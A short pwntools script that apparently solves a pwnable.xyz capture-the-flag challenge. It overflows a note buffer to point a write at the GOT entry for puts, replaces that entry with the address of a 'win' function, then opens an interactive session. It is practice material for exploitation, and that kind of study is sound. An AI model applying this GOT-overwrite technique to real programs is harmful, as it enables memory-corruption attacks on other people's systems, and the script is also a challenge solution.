from pwn import *

exe = ELF("./challenge", checksec=True)

context.binary = exe

HOST = "svc.pwnable.xyz"
PORT = 30016

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
# args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def main():
    r  = conn()

    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"len?", b"40")
    r.sendafter(b"note: ", b"a" * 32 + pack(exe.got.puts))
    
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"desc: ", pack(exe.symbols.win))

    r.sendlineafter(b"> ", b"3")
    r.interactive()

if __name__ == "__main__":
    main()
